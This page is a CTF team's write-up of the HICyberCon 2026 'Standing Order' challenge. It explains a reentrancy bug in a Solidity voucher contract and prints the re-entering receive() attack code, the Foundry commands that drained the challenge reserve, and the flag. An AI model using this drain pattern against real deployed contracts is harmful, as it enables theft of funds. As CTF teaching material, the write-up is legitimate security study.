@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Standing Order · HICyberCon CTF 2026 writeup · NXT_CTFS</title>
+<meta name="description" content="The same committee signature is valid on both voucher paths, and disburse() pays out before marking the voucher used. A contract that re-enters disburse() from receive() drains the reserve 1 ether at a time." />
+<link rel="icon" href="../images/brand/logo-v2.png" type="image/png" />
+<link rel="stylesheet" href="../css/fonts.css?v=80d02232" />
+<link rel="stylesheet" href="../css/base.css?v=158fffd0" />
+<link rel="stylesheet" href="../css/components.css?v=9bb4ee8e" />
+<link rel="stylesheet" href="../css/pages.css?v=15906e9c" />
+<script>document.documentElement.classList.add('js');</script>
+</head>
+<body>
+
+<nav class="nav" id="nav">
+  <div class="container nav-inner">
+    <div class="nav-id">
+      <a href="../index.html#top" class="brand">
+        <img src="../images/brand/logo-v2.png" alt="NXT_CTFS logo" />
+        <span class="brand-name">NXT_CTFS</span>
+      </a>
+    </div>
+    <div class="nav-links">
+      <a href="../writeups.html" class="is-active">writeups</a>
+      <a href="../index.html#team">team</a>
+      <a href="../index.html#shell">try a box</a>
+      <a href="../index.html#join">join</a>
+    </div>
+    <div class="nav-cta">
+      <a href="../index.html#join" class="btn btn-secondary">Join us</a>
+      <button class="nav-toggle" id="navToggle" aria-label="Toggle menu" aria-expanded="false">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+          <line x1="4" y1="7" x2="20" y2="7"></line>
+          <line x1="4" y1="12" x2="20" y2="12"></line>
+          <line x1="4" y1="17" x2="20" y2="17"></line>
+        </svg>
+      </button>
+    </div>
+  </div>
+  <div class="mobile-panel" id="mobilePanel">
+    <a href="../writeups.html">writeups</a>
+    <a href="../index.html#team">team</a>
+    <a href="../index.html#shell">try a box</a>
+    <a href="../index.html#join">join</a>
+  </div>
+</nav>
+
+<div class="wu-progress" aria-hidden="true"><div class="wu-progress-bar" id="wuProgress"></div></div>
+  <main class="page-main container" id="top">
+  <nav class="crumbs" aria-label="Breadcrumb"><a href="../index.html#top">nxt_ctfs</a> <span aria-hidden="true">/</span> <a href="../writeups.html">writeups</a> <span aria-hidden="true">/</span> <a href="../events/hicybercon-ctf-2026.html">hicybercon-ctf-2026</a> <span aria-hidden="true">/</span> <span>standing-order</span></nav>
+
+  <header class="page-head">
+    
+    <div class="page-head-body">
+      <h1>Standing Order <span class="page-sub">Reentrancy across two redemption paths</span></h1>
+      <div class="page-meta"><span class="wu-cat wu-cat-misc">misc</span></div>
+      
+      <div class="wu-flagrow">
+        <span class="wu-flagrow-k">flag</span>
+        <code id="wuFlag">hiCTF{one_sig_two_paths_then_the_l00p_df97c83cf9}</code>
+        <button type="button" class="wu-copy" data-copy="#wuFlag" aria-label="Copy flag">copy</button>
+      </div>
+    </div>
+  </header>
+
+    <div class="wu-layout">
+    <article class="wu-article">
+<p>HI CyberCon 2026. Live instancer chain: <code>https://standing-order-&lt;id&gt;.chall.hiddeninvestigations.net</code>
+(RPC at <code>/</code>, handout at <code>/info</code>, flag at <code>/flag</code>), Foundry <code>cast</code>/<code>forge</code>, Solidity 0.8.24.</p>
+<h2 id="flag"><a class="wu-anchor" href="#flag" aria-hidden="true">#</a>FLAG</h2>
+<figure class="wu-code wu-code-output" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-1" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-1"><code class="language-text">hiCTF{one_sig_two_paths_then_the_l00p_df97c83cf9}</code></pre>
+      
+    </figure><p>(served by <code>GET /flag</code> once <code>Setup.isSolved()</code> is true)</p>
+<h2 id="the-bug"><a class="wu-anchor" href="#the-bug" aria-hidden="true">#</a>The bug</h2>
+<p><code>Disbursement</code> has two redemption paths over the <strong>same</strong> voucher:</p>
+<ul>
+<li><code>acknowledge()</code> - checks-effects-interactions: <code>voucherUsed[digest] = true</code> BEFORE the ETH send.</li>
+<li><code>disburse()</code> - interaction BEFORE effect: <code>recipient.call{value: amount}(&quot;&quot;)</code> first,
+<code>voucherUsed[digest] = true</code> only after the call returns.</li>
+</ul>
+<p><code>voucherDigest(amount, nonce) = keccak256(abi.encodePacked(amount, nonce))</code> - no recipient,
+no function selector, so the same committee signature is valid on both paths. The only thing
+stopping a replay is the <code>voucherUsed</code> mapping, and <code>disburse()</code> sets it too late.</p>
+<h2 id="exploit-reentrancy-through-the-value-callback"><a class="wu-anchor" href="#exploit-reentrancy-through-the-value-callback" aria-hidden="true">#</a>Exploit - reentrancy through the value callback</h2>
+<p>Instance parameters (read from Setup): <code>RESERVE = 20 ether</code>, <code>VOUCHER_AMOUNT = 1 ether</code>,
+<code>VOUCHER_NONCE = 0</code>, one 65-byte committee signature.</p>
+<p>Because <code>disburse()</code> pays before marking the voucher used, every nested frame re-checks
+<code>!voucherUsed[digest]</code> and still sees <code>false</code>. A contract that re-enters <code>disburse()</code> from its
+<code>receive()</code> keeps getting 1 ether per level until the reserve cannot cover another payout.</p>
+<p>contracts/Attack.sol:</p>
+<figure class="wu-code wu-code-output" data-lines="9">
+      <figcaption>
+        
+        <span class="wu-code-lang">solidity</span>
+        <button type="button" class="wu-copy" data-copy="#code-2" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-2"><code class="language-solidity">receive() external payable {
+    entries++;
+    if (address(target).balance &gt;= amount) {          // stop at balance == amount -&gt; last payout leaves 0
+        (bool ok,) = address(target).call(            // low-level: an inner failure can't revert the chain
+            abi.encodeWithSelector(IDisbursement.disburse.selector, address(this), amount, nonce, sig)
+        );
+        ok;
+    }
+}</code></pre>
+      
+    </figure><p>Threshold matters: re-entering when only <code>&lt; amount</code> is left would make the inner
+<code>require(ok, &quot;pay: failed&quot;)</code> revert and unwind the whole chain.</p>
+<h2 id="execution"><a class="wu-anchor" href="#execution" aria-hidden="true">#</a>Execution</h2>
+<figure class="wu-code" data-lines="13">
+      <figcaption>
+        
+        <span class="wu-code-lang">bash</span>
+        <button type="button" class="wu-copy" data-copy="#code-3" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-3"><code class="language-bash"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-built_in">export</span> PATH=<span class="hljs-string">&quot;<span class="hljs-variable">$PATH</span>:<span class="hljs-variable">$HOME</span>/.foundry/bin&quot;</span></span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">R=https://standing-order-1be4a0b3527f.chall.hiddeninvestigations.net</span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc">S=0x4A8cde36e5fd97a683Ef39fd6b3FAe40DE81fF13</span></span>
+<span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc">D=$(cast call <span class="hljs-variable">$S</span> <span class="hljs-string">&#x27;disbursement()(address)&#x27;</span> --rpc-url <span class="hljs-variable">$R</span>)     <span class="hljs-comment"># 0x4BA7b0Be...394b</span></span></span>
+<span class="wu-line" data-line="5"><span class="wu-ln">5</span><span class="wu-lc">cast call <span class="hljs-variable">$S</span> <span class="hljs-string">&#x27;voucher()(uint256,uint256,bytes)&#x27;</span> --rpc-url <span class="hljs-variable">$R</span> <span class="hljs-comment"># 1e18, 0, 0xa45292...4de91b</span></span></span>
+<span class="wu-line" data-line="6"><span class="wu-ln">6</span><span class="wu-lc"></span></span>
+<span class="wu-line" data-line="7"><span class="wu-ln">7</span><span class="wu-lc"><span class="hljs-comment"># SIG = 0xa45292a319341b3d8bb2a5f7ad6f24439de369c2db1d91e17775b8bbbe31a7bf4c186715f58dc471634a4fede32efd50e10293774300f850f0fa9f8b150a4de91b</span></span></span>
+<span class="wu-line" data-line="8"><span class="wu-ln">8</span><span class="wu-lc"><span class="hljs-comment"># deploy the attacker (constructor: target, amount, nonce, sig)</span></span></span>
+<span class="wu-line" data-line="9"><span class="wu-ln">9</span><span class="wu-lc">forge create contracts/Attack.sol:StandingOrderAttack --rpc-url <span class="hljs-variable">$R</span> \</span></span>
+<span class="wu-line" data-line="10"><span class="wu-ln">10</span><span class="wu-lc">  --private-key <span class="hljs-variable">$PK</span> --broadcast --constructor-args <span class="hljs-variable">$D</span> 1000000000000000000 0 <span class="hljs-variable">$SIG</span></span></span>
+<span class="wu-line" data-line="11"><span class="wu-ln">11</span><span class="wu-lc"></span></span>
+<span class="wu-line" data-line="12"><span class="wu-ln">12</span><span class="wu-lc">cast send &lt;attacker&gt; <span class="hljs-string">&#x27;go()&#x27;</span> --rpc-url <span class="hljs-variable">$R</span> --private-key <span class="hljs-variable">$PK</span> --gas-limit 5000000</span></span>
+<span class="wu-line" data-line="13"><span class="wu-ln">13</span><span class="wu-lc">curl -sk <span class="hljs-variable">$R</span>/flag</span></span></code></pre>
+      
+    </figure><p>Result: <code>status 1</code>, <code>gasUsed 400782</code>, <code>entries = 20</code>, Disbursement balance 20 ether -&gt; 0,
+<code>isSolved() == true</code>.</p>
+<h2 id="verification-discipline"><a class="wu-anchor" href="#verification-discipline" aria-hidden="true">#</a>Verification discipline</h2>
+<p>Proven on an <code>anvil --fork-url &lt;instance&gt; -a 0</code> fork FIRST (free, resettable): 20 re-entries,
+drain to 0, <code>isSolved() == true</code>, then the identical tx replayed on the live chain with the same
+result. No guessing about depth/gas - the loop is balance-bounded, so the depth (20) falls out of
+<code>RESERVE / VOUCHER_AMOUNT</code>.</p>
+
+    </article>
+    <nav class="wu-toc" aria-label="On this page">
+        <button type="button" class="wu-toc-toggle" aria-expanded="false">On this page</button>
+        <p class="wu-toc-h">On this page</p>
+        <ol><li><a href="#flag">FLAG</a></li><li><a href="#the-bug">The bug</a></li><li><a href="#exploit-reentrancy-through-the-value-callback">Exploit - reentrancy through the value callback</a></li><li><a href="#execution">Execution</a></li><li><a href="#verification-discipline">Verification discipline</a></li></ol>
+      </nav>
+  </div>
+
+  <nav class="wu-pager" aria-label="More writeups">
+    <a class="wu-pager-link wu-pager-prev" href="ground-station.html"><span class="wu-pager-dir">&larr; Previous</span><span class="wu-pager-name">Ground Station</span></a>
+    <a class="wu-pager-link wu-pager-next" href="quiet-upgrade.html"><span class="wu-pager-dir">Next &rarr;</span><span class="wu-pager-name">Quiet Upgrade</span></a>
+  </nav>
+</main>
+
+<footer class="footer container">
+  <div class="footer-grid">
+    <div>
+      <a href="../index.html#top" class="footer-brand">
+        <img src="../images/brand/logo-v2.png" alt="NXT_CTFS logo" />
+        <span>NXT_CTFS</span>
+      </a>
+      <p class="footer-tag">A team built around curiosity, persistence, and the occasional 3am breakthrough.</p>
+    </div>
+    <div class="footer-col">
+      <h4>Connect</h4>
+      <a href="https://discord.gg/AnmfSNMvS" target="_blank" rel="noopener noreferrer">Discord</a>
+      <a href="https://github.com/HappyCPPD/NxT-s-Team-Library" target="_blank" rel="noopener noreferrer">GitHub</a>
+      <a href="https://ctftime.org/team/442864" target="_blank" rel="noopener noreferrer">CTFtime</a>
+    </div>
+  </div>
+  <div class="footer-bottom">
+    <span>&copy; 2026 NXT_CTFS. All rights reserved.</span>
+    <span class="footer-hint">Two flags on this page. One is in the sandbox.</span>
+  </div>
+</footer>
+
+<script src="../js/script.js?v=2912532e"></script>
+</body>
+</html>
